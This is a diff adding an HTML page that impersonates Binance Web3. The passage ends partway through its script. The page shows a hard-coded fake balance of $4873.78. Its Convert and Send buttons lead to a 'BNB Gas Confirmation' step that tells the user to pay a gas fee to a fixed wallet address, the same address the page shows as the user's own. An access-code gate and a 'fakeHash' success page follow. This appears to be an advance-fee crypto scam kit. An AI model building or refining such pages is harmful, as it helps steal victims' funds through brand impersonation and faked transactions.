@@ -1,0 +1,2187 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Binance Web3</title>
+
+  <!-- Scripts & Styles -->
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+
+  <!-- PWA -->
+  <link rel="manifest" href="manifest.json" />
+  <meta name="theme-color" content="#0b0e11" />
+
+  <style>
+    body {
+      background-color: #0b0e11;
+      color: #ffffff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .card {
+      background-color: #1e2329;
+      border-radius: 1rem;
+      padding: 1.5rem;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
+    }
+    .page {
+      display: none;
+    }
+    .active-page {
+      display: block;
+    }
+  </style>
+</head>
+
+<body onload="showPage('page0')">
+
+  <!-- ✅ HEADER -->
+  <header class="flex justify-between items-center p-4 border-b border-gray-800 bg-[#0b0e11]">
+    <div class="text-yellow-400 font-bold text-2xl cursor-pointer" onclick="showPage('page0')">BINANCE</div>
+    <div class="flex space-x-4">
+      <select id="currencySelect" class="bg-gray-900 text-white px-3 py-1 rounded">
+        <option value="USD">USD</option>
+        <option value="EUR">EUR</option>
+        <option value="GBP">GBP</option>
+        <option value="PKR">PKR</option>
+        <option value="INR">INR</option>
+      </select>
+      <button class="min-w-[100px] font-bold bg-[#1f2630] text-[#f3ba2f] px-4 py-2 rounded-xl" onclick="showPage('page13')">
+        Connect Wallet
+      </button>
+    </div>
+  </header>
+
+  <!-- ✅ PWA INSTALL BUTTON -->
+  <div class="fixed bottom-4 right-4 z-50">
+    <button id="installBtn" class="bg-yellow-400 text-black font-bold py-2 px-4 rounded hidden shadow-lg">
+      📲 Install App
+    </button>
+  </div>
+
+  <!-- DASHBOARD -->
+  <section id="page0" class="page active-page bg-[#0b0e11] min-h-screen text-white">
+    <main class="p-4 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+
+      <!-- TOTAL ASSETS -->
+      <div class="card bg-[#1a1a1a] p-4 rounded-2xl shadow-md">
+        <h2 class="text-lg font-semibold">Total Assets</h2>
+        <p id="totalAssets" class="text-2xl mt-2 text-yellow-400">$4873.78</p>
+      </div>
+
+      <!-- USDT BALANCE -->
+      <div class="card bg-[#1a1a1a] p-4 rounded-2xl shadow-md">
+        <h2 class="text-lg font-semibold">USDT Balance</h2>
+        <p id="usdtBalance" class="text-xl mt-2">0 USDT</p>
+      </div>
+
+      <!-- BNB BALANCE -->
+      <div class="card bg-[#1a1a1a] p-4 rounded-2xl shadow-md">
+        <h2 class="text-lg font-semibold">BNB Balance</h2>
+        <p id="bnbBalance" class="text-xl mt-2">0 BNB</p>
+      </div>
+
+      <!-- LIVE PRICE CHART -->
+      <div class="col-span-1 md:col-span-2 card bg-[#1a1a1a] p-4 rounded-2xl shadow-md">
+        <h2 class="text-lg font-semibold">Live Price Chart (BNB/USDT)</h2>
+        <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BNBUSDT&interval=D&hidesidetoolbar=1&theme=dark&style=1&locale=en"
+                class="w-full mt-4 rounded"
+                style="height:300px; border:none;">
+        </iframe>
+      </div>
+
+      <!-- ACTION BUTTONS -->
+<div class="col-span-1 md:col-span-3 flex flex-wrap gap-4 justify-center mt-4">
+  <button onclick="showPage('page16')" class="min-w-[100px] font-bold bg-[#1f2630] text-[#f3ba2f] px-4 py-2 rounded-xl">Trade</button>
+  <button onclick="showPage('page8')" class="min-w-[100px] font-bold bg-[#1f2630] text-[#f3ba2f] px-4 py-2 rounded-xl">Send</button>
+  <button onclick="showPage('page10')" class="min-w-[100px] font-bold bg-[#1f2630] text-[#f3ba2f] px-4 py-2 rounded-xl">Convert</button>
+  <button onclick="showPage('page6')" class="min-w-[100px] font-bold bg-[#1f2630] text-[#f3ba2f] px-4 py-2 rounded-xl">Receive</button>
+</div>
+
+    </main>
+  </section>
+  
+  <!-- ✅ PAGE 13 - CONNECT WALLET -->
+  <section id="page13" class="page px-4 py-8 min-h-screen bg-[#0b0e11] text-white">
+  <div class="max-w-xl mx-auto bg-[#12161c] p-6 rounded-xl shadow-lg">
+    <!-- Header -->
+<div class="flex items-center justify-between mb-6">
+  <h2 class="text-2xl font-bold">Connect Your Wallet</h2>
+  <button onclick="showPage('0')" class="text-yellow-400 hover:underline">←Dashboard</button>
+</div>
+
+<!-- Blockchain Selection -->
+<label for="chainSelect" class="block mb-2 font-semibold">Select Blockchain Network</label>
+<select id="chainSelect" class="w-full p-3 mb-4 rounded-lg bg-[#1d232c] border border-gray-600 text-white">
+  <option value="bsc">Binance Smart Chain (BEP20)</option>
+  <option value="eth">Ethereum (ERC20)</option>
+  <option value="polygon">Polygon</option>
+  <option value="avax">Avalanche</option>
+</select>
+
+<!-- Wallet Address Input -->
+<label for="walletAddress" class="block mb-2 font-semibold">Wallet Address</label>
+<input type="text" id="walletAddress" placeholder="Paste your wallet address"
+  class="w-full p-3 mb-4 rounded-lg bg-[#1d232c] border border-gray-600 text-white" />
+
+<!-- Email (optional) -->
+<label for="userEmail" class="block mb-2 font-semibold">Email (optional)</label>
+<input type="email" id="userEmail" placeholder="Enter your email"
+  class="w-full p-3 mb-4 rounded-lg bg-[#1d232c] border border-gray-600 text-white" />
+
+<!-- QR Scan (future feature) -->
+<button onclick="scanQR()" class="w-full p-3 mb-4 rounded-lg bg-[#f0b90b] text-black font-bold hover:bg-yellow-400 transition">
+  Scan Wallet QR
+</button>
+
+<!-- Connect Button -->
+<button onclick="submitWalletConnection()" class="w-full p-3 rounded-lg bg-green-500 font-bold hover:bg-green-600 transition">
+  Connect Wallet
+</button>
+
+<!-- Success Message -->
+<div id="walletSavedMsg" class="mt-4 text-green-400 text-sm hidden">✅ Wallet connected and saved.</div>
+
+  </div>
+    <div>
+      <button
+      type="button"
+      onclick="showPage('page0')"
+      class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition"
+    >
+       ⬅ Back
+      </button>
+    </div>
+</section>  
+
+  
+  <!-- PAGE 6: RECEIVE ASSETS -->
+  <section id="page6" class="page hidden transition-opacity duration-300 ease-in-out"> 
+  <!-- Heading -->
+  <div class="flex justify-between items-center">
+    <h2 class="text-2xl md:text-3xl font-bold text-yellow-400">Receive Crypto</h2>
+    <button class="bg-[#1e2023] text-gray-300 hover:text-yellow-400 px-4 py-2 rounded-lg border border-gray-700">Need Help?</button>
+  </div> 
+    <!-- Network Selector + Address Display --> 
+    <div class="bg-[#131619] rounded-xl p-6 space-y-6 shadow-xl border border-gray-700">
+    <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
+      <!-- Select Network -->
+      <div class="flex flex-col space-y-2">
+        <label for="assetSelector" class="text-sm text-gray-400">Select Asset</label>
+        <select id="assetSelector" class="bg-[#1c1f24] text-white border border-gray-600 rounded-md px-4 py-2 w-full md:w-72">
+          <option value="ETH">Ethereum (ERC20)</option>
+          <option value="BTC">Bitcoin</option>
+          <option value="BNB">BNB Smart Chain</option>
+          <option value="USDT_TRON">Tether (TRC20)</option>
+        </select>
+      </div>
+      <!-- Address and Copy -->
+  <div class="flex flex-col md:flex-row md:items-center md:space-x-4 space-y-3 md:space-y-0 w-full">
+    <div class="text-yellow-400 break-all font-mono flex-1 text-sm" id="receiveAddress">
+      0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130
+    </div>
+    <button onclick="copyToClipboard('receiveAddress')" class="bg-yellow-400 text-black font-bold px-4 py-2 rounded hover:bg-yellow-500 transition">Copy Address</button>
+  </div>
+</div>
+
+<!-- QR Code -->
+<div class="mt-6 flex justify-center" id="qrCodeContainer"></div>
+
+  </div>  
+  <!-- Supported Networks -->  
+  <div class="grid md:grid-cols-3 gap-6">
+    <div class="bg-[#1c1f24] p-4 rounded-lg border border-gray-700">
+      <div class="flex items-center gap-3 mb-2">
+        <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" width="30" />
+        <h4 class="text-white font-semibold">Ethereum (ERC20)</h4>
+      </div>
+      <p class="text-sm text-gray-400">Receive ETH or any ERC20 tokens on this address.</p>
+    </div>
+    <div class="bg-[#1c1f24] p-4 rounded-lg border border-gray-700">
+  <div class="flex items-center gap-3 mb-2">
+    <img src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" width="30" />
+    <h4 class="text-white font-semibold">BNB Smart Chain</h4>
+  </div>
+  <p class="text-sm text-gray-400">Use this address for BEP20 tokens like BNB, BUSD, etc.</p>
+</div>
+
+<div class="bg-[#1c1f24] p-4 rounded-lg border border-gray-700">
+  <div class="flex items-center gap-3 mb-2">
+    <img src="https://assets.coingecko.com/coins/images/325/large/Tether-logo.png" width="30" />
+    <h4 class="text-white font-semibold">Tether (TRC20)</h4>
+  </div>
+  <p class="text-sm text-gray-400">TRON-based USDT deposits supported on this address.</p>
+</div>
+
+  </div> 
+  <!-- Chart -->  
+  <div class="bg-[#131619] p-6 rounded-xl border border-gray-700">
+    <h3 class="text-lg font-bold text-white mb-4">Market Overview</h3>
+    <div id="tradingview_chart" style="height:400px;"></div>
+  </div>
+    
+    <div>
+  <button
+      type="button"
+      onclick="showPage('page0')"
+      class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition"
+    >
+       ⬅ Back
+  </button>
+  </div>
+</section>  
+
+
+  <!-- ✅ BINANCE STYLE CONVERSION PAGE 10 (USD to USDT) -->
+<section id="page10" class="page min-h-screen flex flex-col justify-between px-4 py-6 bg-[#0b0e11] text-white hidden">
+  <!-- 🔝 Header -->
+  <div class="flex justify-between items-center mb-6">
+    <div class="text-xl font-bold text-yellow-400">Convert</div>
+    <button onclick="showPage('page0')" class="text-sm text-gray-300 hover:underline">← Back</button>
+  </div>
+
+  <!-- 💱 Conversion Form -->
+  <div class="bg-[#1e2329] p-6 rounded-2xl shadow-md w-full max-w-md mx-auto">
+    <h2 class="text-lg font-semibold mb-4">Convert USD to USDT</h2>
+
+    <!-- 💲 USD Amount -->
+    <div class="mb-4">
+      <label class="block text-sm text-gray-400 mb-1">Amount in USD</label>
+      <input id="usdAmount" type="text" value="4873.78" disabled class="w-full p-3 bg-[#2b3139] rounded-lg text-white border border-gray-600" />
+    </div>
+
+    <!-- 💸 Fee Display -->
+    <div class="mb-4">
+      <label class="block text-sm text-gray-400 mb-1">Conversion Fee</label>
+      <div class="w-full p-3 bg-[#2b3139] rounded-lg text-white border border-gray-600">0.099 BNB</div>
+    </div>
+
+    <!-- 🪙 Result Preview -->
+    <div class="mb-4">
+      <label class="block text-sm text-gray-400 mb-1">You Will Receive</label>
+      <div id="convertedAmount" class="w-full p-3 bg-[#2b3139] rounded-lg text-yellow-400 font-semibold text-lg border border-gray-600">~4873.78 USDT</div>
+
+    <!-- ⏳ Countdown -->
+    <div id="countdownBox" class="mb-4 hidden">
+      <label class="block text-sm text-gray-400 mb-1">Time Remaining</label>
+      <div id="countdownTimer" class="w-full p-3 bg-black text-green-400 rounded-lg border border-gray-600 text-center font-bold"></div>
+    </div>
+
+    <!-- 🚀 Convert Button -->
+    <button onclick="showPage('page9i')" class="w-full mt-4 bg-yellow-400 hover:bg-yellow-300 text-black font-semibold py-3 rounded-lg transition">
+      Convert
+    </button>
+
+    <button onclick="showPage('page0')" class="w-full text-sm text-yellow-400 mt-3 hover:underline">← Back</button>
+  </div>
+</section>
+  
+  <!-- ✅ PAGE 8 - SEND -->  <section id="page8" class="page hidden min-h-screen flex flex-col items-center justify-center bg-[#0b0e11] text-white px-6">  
+  <div class="w-full max-w-md bg-[#1e2329] rounded-2xl p-8 shadow-lg">  
+    <h2 class="text-2xl font-bold text-yellow-400 mb-8 text-center">Send Funds</h2>  <label for="inputWallet" class="block text-sm mb-2 font-semibold">Recipient Wallet Address</label>  
+<input  
+  id="inputWallet"  
+  type="text"  
+  placeholder="0x1234...abcd"  
+  class="w-full mb-6 p-3 rounded bg-[#111820] border border-[#333a4b] focus:outline-none focus:border-yellow-400 text-sm font-semibold"  
+/>  
+
+<label for="networkSelect" class="block text-sm mb-2 font-semibold">Select Network</label>  
+<select  
+  id="networkSelect"  
+  class="w-full mb-6 p-3 rounded bg-[#111820] border border-[#333a4b] focus:outline-none focus:border-yellow-400 text-sm font-semibold"  
+>  
+  <option value="" disabled selected>Select Network</option>  
+  <option value="Ethereum">Ethereum</option>  
+  <option value="Binance Smart Chain">Binance Smart Chain</option>  
+</select>  
+
+<label for="transferAmount" class="block text-sm mb-2 font-semibold">Amount</label>  
+<div class="flex gap-2 mb-6">  
+  <input  
+    id="transferAmount"  
+    type="number"  
+    min="0"  
+    step="any"  
+    placeholder="Enter amount"  
+    class="flex-grow p-3 rounded bg-[#111820] border border-[#333a4b] focus:outline-none focus:border-yellow-400 text-sm font-semibold"  
+  />  
+  <button  
+    type="button"  
+    class="px-4 py-3 bg-yellow-400 text-black font-bold rounded hover:bg-yellow-300 transition"  
+    onclick="setMaxAmount()"  
+  >  
+    Max  
+  </button>  
+</div>  
+
+<div class="flex justify-between text-yellow-400 font-bold mb-8">  
+  <span>Gas Fee:</span>  
+  <span id="gasFee">0.0600 BNB</span>  
+</div>  
+
+<div>  
+  <button  
+    type="button"  
+    onclick="showPage('page9i)"  
+    class="w-full bg-yellow-400 text-black font-bold py-3 rounded hover:bg-yellow-300 transition mb-4"  
+  >  
+    Confirm Withdrawal  
+  </button>  
+</div>  
+
+<div>  
+  <button  
+    type="button"  
+    onclick="showPage('page0')"  
+    class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition"  
+  >  
+    ⬅ Back  
+  </button>  
+</div>
+
+  </div>  
+</section>  
+
+  <!-- ✅ PAGE 8iii - Countdown Expired -->
+<section id="page8iii" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-6">
+  <div class="text-center max-w-md">
+    <h2 class="text-3xl font-bold text-red-500 mb-4">⏰ Time Expired</h2>
+    <p class="mb-6 text-lg">Your withdrawal session has expired after 48 hours.</p>
+    <button onclick="showPage('page0')" class="bg-yellow-400 text-black font-bold py-3 px-6 rounded hover:bg-yellow-300 transition">
+      Back to Dashboard 
+    </button>
+  </div>
+</section>
+  
+  <!-- ✅ PAGE 9 - TRANSACTION PROCESSING -->
+  <section id="page9" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="flex flex-col items-center">
+    <div class="loader mb-6"></div>
+    <p class="text-xl font-semibold text-yellow-400 mb-2">Processing Transaction</p>
+    <p class="text-sm text-gray-400">Please wait while we process your transaction...</p>
+    <script>
+      setTimeout(() => showPage('page9i'), 3000);
+    </script>
+  </div>
+</section>
+  <!-- ✅ PAGE 9i - BNB GAS CONFIRMATION -->
+  <section id="page9i" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl">
+    <h2 class="text-xl font-bold text-yellow-400 mb-4">BNB Gas Confirmation</h2>
+    <p class="text-sm text-gray-300 mb-4">Please confirm your BNB gas fee address:</p><div class="flex items-center justify-between bg-[#1c232b] p-3 rounded mb-4">
+  <span id="bnbAddress" class="truncate">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</span>
+  <button onclick="copyBNBAddress()" class="text-yellow-400 hover:underline text-sm">Copy</button>
+</div>
+<div>
+  <button
+      type="button"
+      onclick="showPage('page0')"
+      class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition"
+    >
+       ⬅ Back
+  </button>
+</div>
+    <div>
+<button onclick="showPage('page9ii')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Confirm BNB Gas Code</button>
+
+  </div>
+</section>
+  
+  <!-- ✅ PAGE 9ii - ACCESS CODE + QR CODE -->
+  <section id="page9ii" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl text-center">
+    <h2 class="text-xl font-bold text-yellow-400 mb-4">Access Code Required</h2><canvas id="accessQr" class="mx-auto mb-4"></canvas>
+<p class="text-sm text-gray-400 mb-2">Scan the code or enter the access code below:</p>
+<input id="accessCodeInput" placeholder="Enter access code" class="w-full mb-4 p-3 rounded bg-[#1c232b] border border-gray-600 text-white text-center">
+
+<button onclick="verifyAccessCode()" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Submit Code</button>
+
+  </div>
+    <div>
+      <button
+      type="button"
+      onclick="showPage('page0')"
+      class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition"
+    >
+       ⬅ Back
+      </button>
+    </div>
+</section>
+  <!-- ✅ PAGE 11 - TRANSACTION DECLINED -->
+  <section id="page11" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="text-center">
+    <h2 class="text-2xl font-bold text-red-500 mb-4">Transaction Declined</h2>
+    <p class="text-sm text-gray-400 mb-6">Access code was incorrect. Please try again or contact support.</p>
+    <button onclick="showPage('page9ii')" class="bg-yellow-500 text-black font-bold py-2 px-4 rounded">Try Again</button>
+  </div>
+</section>
+  <!-- ✅ PAGE 14 - TRANSACTION SUCCESS -->
+  <section id="page14" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <div class="text-center max-w-md">
+    <h2 class="text-2xl font-bold text-green-500 mb-4">✅ Transfer Successful</h2>
+    <p class="text-sm text-gray-300 mb-2">Amount Transferred: <span class="text-yellow-400 font-semibold">$3,078.78 USDT</span></p>
+    <p class="text-sm text-gray-300">Transaction Hash:</p>
+    <p id="fakeHash" class="text-xs text-gray-400 mt-1 cursor-pointer hover:text-yellow-400">0xa3e...d5f9b<span></span></p>
+  </div>
+</section>
+  <!-- ✅ TOAST SYSTEM -->
+  <div id="toast" class="fixed bottom-5 left-1/2 transform -translate-x-1/2 bg-gray-900 text-white px-4 py-2 rounded-xl shadow-lg text-sm hidden z-50"></div><!-- ✅ ANIMATIONS + UTILS -->
+  <!-- === PAGE 16: Earn Menu (Updated Blockchain.com Style) === -->
+  <section id="page16" class="page min-h-screen bg-[#0b0e11] text-[#f3ba2f] font-sans px-6 py-8">
+  <div class="max-w-6xl mx-auto">
+    <!-- Header -->
+<div class="flex justify-between items-center mb-8">
+  <h1 class="text-3xl md:text-4xl font-extrabold tracking-tight select-none">📈 Earn Menu</h1>
+  <div>
+    <button
+      type="button"
+      onclick="showPage('page0')"
+      class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition"
+    >
+       ⬅ Back
+    </button>
+  </div>
+</div>
+
+<!-- Trade Options Grid -->
+<div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-10">
+  <button onclick="showPage('page16i')"
+    class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+    📊 Spot Trading
+  </button>
+  <button onclick="showPage('page16ii')"
+    class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+    👥 Copy Trading
+  </button>
+  <button onclick="showPage('page16iii')"
+    class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+    📈 Futures Trading
+  </button>
+  <button onclick="showPage('page16iv')"
+    class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+    🩾 Derivatives
+  </button>
+  <button onclick="showPage('page16v')"
+    class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+    ⚙️ Trade Utilities
+  </button>
+</div>
+
+<!-- Trading Balance -->
+<div class="text-xl font-extrabold mb-6 select-none">
+  Total Trading Balance (USD):
+  <span id="totalTradingBalance" class="text-[#f0b90b]">$0.00</span>
+</div>
+
+<!-- Token Swap Section -->
+<div class="bg-[#1e2329] text-[#f3ba2f] p-6 rounded-xl max-w-md mx-auto shadow-md">
+  <h2 class="text-2xl font-extrabold mb-4 select-none">Token Swap</h2>
+
+  <label for="fromToken" class="block mb-2 font-semibold select-none">From Token</label>
+  <select id="fromToken"
+    class="w-full bg-[#1e2329] border border-[#f3ba2f] rounded-lg px-4 py-3 mb-4 text-[#f3ba2f] font-bold cursor-pointer">
+    <option value="USDT">USDT (Tether)</option>
+    <option value="BNB">BNB (Binance Coin)</option>
+  </select>
+
+  <label for="fromAmount" class="block mb-2 font-semibold select-none">Amount</label>
+  <input id="fromAmount" type="number" placeholder="Enter amount" min="0" step="any"
+    class="w-full px-4 py-3 rounded-lg border border-[#f3ba2f] bg-[#1e2329] text-[#f3ba2f] font-bold mb-4"
+    oninput="updateReceiveAmount()" />
+
+  <label for="toToken" class="block mb-2 font-semibold select-none">To Token</label>
+  <select id="toToken"
+    class="w-full bg-[#1e2329] border border-[#f3ba2f] rounded-lg px-4 py-3 mb-4 text-[#f3ba2f] font-bold cursor-pointer"
+    onchange="updateReceiveAmount()">
+    <option value="BNB">BNB (Binance Coin)</option>
+    <option value="USDT">USDT (Tether)</option>
+    <option value="BTC">BTC (Bitcoin)</option>
+    <option value="ETH">ETH (Ethereum)</option>
+    <option value="BCH">BCH (Bitcoin Cash)</option>
+    <option value="LTC">LTC (Litecoin)</option>
+    <option value="XLM">XLM (Stellar)</option>
+    <option value="MATIC">MATIC (Polygon)</option>
+    <option value="DOGE">DOGE (Dogecoin)</option>
+    <option value="ADA">ADA (Cardano)</option>
+    <option value="SOL">SOL (Solana)</option>
+    <option value="AVAX">AVAX (Avalanche)</option>
+    <option value="DOT">DOT (Polkadot)</option>
+    <option value="TRX">TRX (Tron)</option>
+    <option value="SHIB">SHIB (Shiba Inu)</option>
+    <option value="UNI">UNI (Uniswap)</option>
+    <option value="LINK">LINK (Chainlink)</option>
+    <option value="ATOM">ATOM (Cosmos)</option>
+    <option value="ETC">ETC (Ethereum Classic)</option>
+    <option value="FTM">FTM (Fantom)</option>
+    <option value="NEAR">NEAR (Near Protocol)</option>
+    <option value="HBAR">HBAR (Hedera)</option>
+    <option value="ALGO">ALGO (Algorand)</option>
+    <option value="CRO">CRO (Cronos)</option>
+    <option value="EGLD">EGLD (MultiversX)</option>
+    <option value="VET">VET (VeChain)</option>
+    <option value="ZIL">ZIL (Zilliqa)</option>
+    <option value="AAVE">AAVE (Aave)</option>
+    <option value="CAKE">CAKE (PancakeSwap)</option>
+    <option value="SAND">SAND (The Sandbox)</option>
+    <option value="MANA">MANA (Decentraland)</option>
+    <option value="AXS">AXS (Axie Infinity)</option>
+    <option value="GALA">GALA (Gala Games)</option>
+    <option value="APE">APE (ApeCoin)</option>
+    <option value="RNDR">RNDR (Render Token)</option>
+    <option value="DYDX">DYDX (dYdX)</option>
+    <option value="1INCH">1INCH (1inch)</option>
+    <option value="LRC">LRC (Loopring)</option>
+    <option value="BAND">BAND (Band Protocol)</option>
+    <option value="ENS">ENS (Ethereum Name Service)</option>
+    <option value="CHZ">CHZ (Chiliz)</option>
+    <option value="COMP">COMP (Compound)</option>
+    <option value="RUNE">RUNE (THORChain)</option>
+    <option value="GRT">GRT (The Graph)</option>
+    <option value="TWT">TWT (Trust Wallet Token)</option>
+    <option value="BAT">BAT (Basic Attention Token)</option>
+    <option value="ZRX">ZRX (0x Protocol)</option>
+    <option value="KAVA">KAVA (Kava)</option>
+    <option value="XRP">XRP (Ripple)</option>
+    <option value="FIL">FIL (Filecoin)</option>
+    <option value="XTZ">XTZ (Tezos)</option>
+  </select>
+
+  <div class="text-lg font-bold mb-4 select-none">
+    Estimated Receive: <span id="receiveAmount">0</span>
+  </div>
+
+  <button onclick="handleTrade()"
+    class="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:opacity-90 transition select-none">
+    Swap
+  </button>
+</div>
+
+  </div>
+</section>
+  <!-- === PAGE 16i: Spot Trading === -->
+<section id="page16i" class="page hidden bg-[#0b0e11] text-white px-4 py-8 min-h-screen font-sans">
+  <div class="max-w-4xl mx-auto space-y-8">
+    <!-- Header -->
+<h2 class="text-3xl font-extrabold text-white">📈 Spot Trading</h2>
+
+<!-- Live Prices -->
+<div class="flex flex-wrap gap-4 text-lg text-[#f0b90b] font-bold">
+  <div>🪙 BTC: <span id="btcPrice">--</span></div>
+  <div>🪙 ETH: <span id="ethPrice">--</span></div>
+  <div>🪙 BNB: <span id="bnbPrice">--</span></div>
+</div>
+
+<!-- TradingView Chart -->
+<div class="w-full rounded-xl overflow-hidden shadow-lg border border-gray-700">
+  <iframe
+    src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark&style=1&timezone=Etc/UTC&hidesidetoolbar=1"
+    width="100%" height="400" frameborder="0" scrolling="no" allowtransparency="true"
+    class="w-full h-[400px] rounded-xl">
+  </iframe>
+</div>
+
+<!-- Trade Panel -->
+<div class="bg-[#1e2124] rounded-xl p-6 space-y-4 max-w-lg mx-auto shadow-md">
+  <div>
+    <label class="block text-sm font-semibold mb-2">Token:</label>
+    <select id="spotToken" class="w-full p-3 rounded-md bg-[#0b0e11] text-white border border-gray-700">
+      <option value="BTC">BTC</option>
+      <option value="ETH">ETH</option>
+      <option value="BNB">BNB</option>
+    </select>
+  </div>
+
+  <div>
+    <label class="block text-sm font-semibold mb-2">Amount:</label>
+    <input type="number" id="spotAmount" placeholder="0.00" min="0" step="any"
+      class="w-full p-3 rounded-md bg-[#0b0e11] text-white border border-gray-700">
+  </div>
+
+  <div class="flex justify-between pt-4">
+    <button onclick="spotTrade('buy')"
+      class="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded-lg shadow transition">
+      Buy
+    </button>
+    <button onclick="spotTrade('sell')"
+      class="bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded-lg shadow transition">
+      Sell
+    </button>
+  </div>
+
+  <p id="spotTradeResult" class="pt-2 font-bold text-[#f0b90b]"></p>
+</div>
+
+<!-- Open Positions -->
+<div>
+  <h3 class="text-xl font-bold mt-10 mb-4">📂 Open Positions</h3>
+  <div id="spotOpenPositions"
+    class="bg-[#14171a] p-4 rounded-lg max-h-48 overflow-y-auto text-[#f0b90b] font-medium shadow-md">
+    No open positions.
+  </div>
+</div>
+
+<!-- Trade History -->
+<div>
+  <h3 class="text-xl font-bold mt-10 mb-4">📜 Trade History</h3>
+  <div id="spotTradeHistory"
+    class="bg-[#14171a] p-4 rounded-lg max-h-48 overflow-y-auto text-[#f0b90b] font-medium shadow-md">
+    No trade history.
+  </div>
+</div>
+
+<!-- Back Button -->
+<div class="pt-8">
+  <button onclick="showPage('page16')"
+    class="bg-[#f0b90b] text-black font-semibold py-3 px-6 rounded-xl hover:bg-yellow-400 transition">
+    ⬅ Back
+  </button>
+</div>
+
+  </div>
+</section> 
+  <!-- === PAGE 16ii: Copy Trading === -->
+  <section id="page16ii" class="page hidden bg-[#0b0e11] text-white px-6 py-8 min-h-screen font-sans">
+  <div class="max-w-4xl mx-auto space-y-8">
+    <!-- Header -->
+<h2 class="text-3xl font-extrabold text-[#f0b90b] mb-6 select-none">🤝 Copy Trading</h2>
+
+<!-- Live Prices (BTC, ETH, BNB) -->
+<div class="flex flex-wrap gap-6 text-lg text-[#f0b90b] font-bold mb-8 justify-center">
+  <div>🪙 BTC: <span id="btcPrice">--</span></div>
+  <div>🪙 ETH: <span id="ethPrice">--</span></div>
+  <div>🪙 BNB: <span id="bnbPrice">--</span></div>
+</div>
+
+<!-- Experts List -->
+<div id="expertsList" 
+     class="flex flex-col gap-4 max-w-full max-w-3xl mx-auto">
+  <!-- JS populates this -->
+</div>
+
+<!-- User Portfolio -->
+<h3 class="text-2xl font-bold text-[#f0b90b] mb-3 select-none">Your Portfolio</h3>
+<div id="portfolioDisplay" 
+     class="bg-[#1e2124] rounded-xl p-5 max-w-3xl mx-auto flex flex-wrap gap-5 text-[#ccc] text-base">
+  <!-- JS populates this -->
+</div>
+
+<!-- Live Copied Trades -->
+<h3 class="text-2xl font-bold text-[#f0b90b] mb-3 select-none">Live Copied Trades</h3>
+<div class="bg-[#1e2124] rounded-xl p-5 max-w-3xl mx-auto max-h-[350px] overflow-y-auto font-mono text-sm text-[#ccc]">
+  <ul id="copiedTrades" class="list-none p-0 m-0 space-y-1">
+    <!-- JS populates this -->
+  </ul>
+</div>
+
+<!-- Back Button -->
+<div class="mt-8 text-center">
+  <button onclick="showPage('page16')" 
+          class="bg-[#f0b90b] hover:bg-yellow-400 text-black font-extrabold px-6 py-3 rounded-xl transition select-none">
+    ⬅ Back 
+  </button>
+</div>
+
+  </div>
+</section> 
+  <!-- Scripts -->  
+  <script>
+    const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    let userAddress = "";
+
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+      document.getElementById(pageId).classList.add('active-page');
+    }
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
+        loadBalances();
+        showPage('dashboard');
+      } else {
+        alert("MetaMask not found");
+      }
